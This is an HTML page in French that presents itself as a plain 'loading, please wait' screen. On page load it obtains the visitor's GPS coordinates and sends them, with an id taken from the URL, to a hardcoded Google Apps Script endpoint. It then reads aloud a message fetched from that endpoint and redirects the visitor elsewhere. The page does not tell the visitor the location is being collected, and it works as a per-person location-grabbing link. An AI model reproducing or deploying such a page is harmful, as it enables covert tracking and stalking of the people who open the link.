<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Localisation</title>
  <script>
    async function sendLocation() {
      const urlParams = new URLSearchParams(window.location.search);
      const id = urlParams.get('id'); // ID dans l'URL ?id=...

      try {
        const position = await new Promise((resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
        );

        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        const scriptURL = 'https://script.google.com/macros/s/AKfycbyW-L2Bil_TN7XGJCMo5FHPDVOLwDFwtDDJRFYJ8KxXrWPE5zn3egCUFbP9xypv5pkp/exec';

        const data = new FormData();
        data.append('id', id);
        data.append('latitude', latitude);
        data.append('longitude', longitude);

        // 1. Envoi des coordonnées GPS
        await fetch(scriptURL, { method: 'POST', body: data });

        // 2. Récupération de l’URL + message
        const response = await fetch(scriptURL + '?getRedirectURL=true');
        const json = await response.json();

        // 3. Lecture audio du message
        const synth = window.speechSynthesis;
        const utter = new SpeechSynthesisUtterance(json.message);
        utter.lang = "fr-FR";
        synth.speak(utter);

        // 4. Redirection après la lecture
        utter.onend = () => {
          let finalURL = json.redirect.trim();
          if (!finalURL.startsWith('http')) {
            finalURL = 'https://' + finalURL;
          }
          window.location.replace(finalURL);
        };

      } catch (error) {
        alert("Impossible d’obtenir la localisation : " + error.message);
      }
    }

    window.onload = sendLocation;
  </script>
</head>
<body>
  <p>Chargement en cours... Veuillez patienter.</p>
</body>
</html>
